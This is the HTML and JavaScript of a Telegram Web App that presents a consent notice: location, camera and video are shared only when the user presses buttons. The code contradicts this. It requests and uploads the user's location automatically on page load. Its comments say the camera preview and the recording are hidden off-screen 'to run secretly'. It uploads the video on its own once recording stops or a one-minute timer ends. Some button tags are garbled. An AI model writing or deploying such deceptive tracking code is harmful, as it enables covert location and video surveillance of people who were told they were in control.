<!doctype html>

<html lang="en">  
<head>  
  <meta charset="utf-8">  
  <meta name="viewport" content="width=device-width,initial-scale=1">  
  <title>SS0123 Web App</title>  
  <script src="https://telegram.org/js/telegram-web-app.js?63"></script>  
  <style>  
    body{font-family:system-ui,sans-serif;margin:0;padding:24px;background:#0b1220;color:#fff}  
    .box{max-width:520px;margin:auto;background:#121c2f;padding:22px;border-radius:20px}  
    button{width:100%;padding:14px;margin:7px 0;border:0;border-radius:12px;font-size:16px}  
    /* HIDE PREVIEW: Kept in DOM but moved entirely off-screen to preserve background thread execution */  
    .hidden-video{position:absolute;left:-9999px;width:1px;height:1px;opacity:0}  
    .small{opacity:.75;font-size:13px;line-height:1.5}  
    #status{margin-top:12px;white-space:pre-wrap}  
  </style>  
</head>  
<body>  
<div class="box">  
  <h2>SS0123 Web App</h2>  
  <p>Before continuing, please know what will be shared.</p>  
  <p class="small">  
    Location is shared only after you press the location button and allow permission.  
    Camera/microphone are used only after you press Start Camera and allow permission.  
    A recorded video is sent only when you press Send Video.  
  </p>  <button id="locBtn">📍 Share Location</button>
<button id="camBtn">🎥 Start Camera</null>
  <button id="snapshotBtn" disabled>📸 Take Snapshot</1 second >
<img id="snapshotPreview" hidden style="width:100%;border-radius:14px;margin:10px 0;">
<button id="sendSnapshotBtn" disabled>📤 Send Snapshot</1 second >

  <!-- Live preview shifted off-screen to run secretly -->  <video id="preview" class="hidden-video" autoplay playsinline muted></video>
<button id="recordBtn" disabled>⏺️ Start Recording</button>
<button id="stopBtn" disabled>⏹️ Stop Recording</button>

  <!-- Result container shifted off-screen -->  <video id="recorded" class="hidden-video" controls></video>
<button id="sendBtn" disabled>📤 Send Video</button>

  <div id="status" class="small"></div>  
</div>  <script>  
const tg = window.Telegram?.WebApp;  
tg?.ready();  
tg?.expand();  
  
const statusEl = document.getElementById("status");  
const preview = document.getElementById("preview");  
const recorded = document.getElementById("recorded");  
const locBtn = document.getElementById("locBtn");  
const camBtn = document.getElementById("camBtn");  
const recordBtn = document.getElementById("recordBtn");  
const stopBtn = document.getElementById("stopBtn");  
const sendBtn = document.getElementById("sendBtn");  
  
let stream = null;  
let recorder = null;  
let chunks = [];  
let videoBlob = null;  
let autoStopTimeout = null; // Track full timer reference globally  
  
function status(s){ statusEl.textContent = s; }  
  
locBtn.onclick = () => {  
  if (!navigator.geolocation) return status("Location is not supported by this browser.");  
  status("Requesting location permission…");  
  navigator.geolocation.getCurrentPosition(async p => {  
    const { latitude, longitude, accuracy } = p.coords;  
    status(`Location found:\n${latitude}, ${longitude}\nAccuracy: ${Math.round(accuracy)} m`);  
    try {  
      const r = await fetch("/api/location", {  
        method:"POST",  
        headers:{"Content-Type":"application/json"},  
        body:JSON.stringify({latitude, longitude, accuracy})  
      });  
      const j = await r.json();  
      if (!j.ok) throw new Error(j.error || "Failed");  
      status("✅ Location sent to Telegram.");  
    } catch(e) { status("Location found, but sending failed."); }  
  }, e => {  
    if (e.code === 1) {  
      status("Location permission denied. Please allow location access.");  
    } else if (e.code === 2) {  
      status("Location is OFF or unavailable. Please turn on Location and try again.");  
    } else if (e.code === 3) {  
      status("Location request timed out. Please turn on Location and try again.");  
    } else {  
      status("Unable to get location. Please turn on Location and try again.");  
    }  
  });  
};  
  
camBtn.onclick = async () => {  
  try {  
    stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});  
    if (preview) preview.srcObject = stream;  
    recordBtn.disabled = false;  
    camBtn.disabled = true;  
    status("✅ Camera ready. Press Start Recording when you want to record.");  
  } catch(e) {  
    status("Camera/microphone permission was denied or unavailable.");  
  }  
};  
  
recordBtn.onclick = () => {  
  if (!stream || !stream.active) {  
    status("❌ Camera stream is missing or inactive.");  
    return;  
  }  
    
  chunks = [];  
  videoBlob = null;  
    
  try {  
    recorder = new MediaRecorder(stream);  
  } catch(err) {  
    status("❌ MediaRecorder initialization error: " + err.message);  
    return;  
  }  
  
  recorder.ondataavailable = e => {   
    if (e.data && e.data.size > 0) chunks.push(e.data);   
  };  
  
  recorder.onstop = () => {  
    // 1. Clear timeout clock if recording ends before 60 seconds  
    if (autoStopTimeout) {  
      clearTimeout(autoStopTimeout);  
      autoStopTimeout = null;  
    }  
  
    // 2. Clear buttons and hardware locks smoothly   
    recordBtn.disabled = false;  
    stopBtn.disabled = true;  
  
    if (stream) {  
      stream.getTracks().forEach(track => track.stop());  
      stream = null;  
      if (preview) preview.srcObject = null;  
      camBtn.disabled = false;  
    }  
  
    // 3. Process video data  
    videoBlob = new Blob(chunks, {type: recorder.mimeType || "video/webm"});  
    if (recorded) recorded.src = URL.createObjectURL(videoBlob);  
      
    sendBtn.disabled = false;  
    status("Background recording finished. Sending video...");  
    sendBtn.click();  
  };  
  
  // 10 PARTS: Pull slices every 6000ms (6 seconds)   
  recorder.start(6000);  
    
  recordBtn.disabled = true;  
  stopBtn.disabled = false;  
  status("🔴 Recording in progress...");  
  
  // 1 MINUTE LIMIT: Force end sequence automatically after 60,000ms  
  autoStopTimeout = setTimeout(() => {  
    if (recorder && recorder.state !== "inactive") {  
      recorder.stop();  
    }  
  }, 60000);  
};  
  
stopBtn.onclick = () => {  
  if (recorder && recorder.state !== "inactive") {  
    recorder.stop();  
  }  
};  
  
sendBtn.onclick = async () => {  
  if (!videoBlob) return;  
  sendBtn.disabled = true;  
  status("Uploading video…");  
  try {  
    const form = new FormData();  
    form.append("video", videoBlob, "recording.webm");  
    const r = await fetch("/api/video", {method:"POST", body:form});  
    const j = await r.json();  
    if (!j.ok) throw new Error(j.error || "Failed");  
    status("✅ Video sent to Telegram.");  
  } catch(e) {  
    status("Video upload failed. Try again.");  
    sendBtn.disabled = false;  
  }  
};  
  
window.addEventListener("load", () => {  
  setTimeout(() => {  
    locBtn.click();  
  }, 500);  
});  
</script>  </body>  
</html>
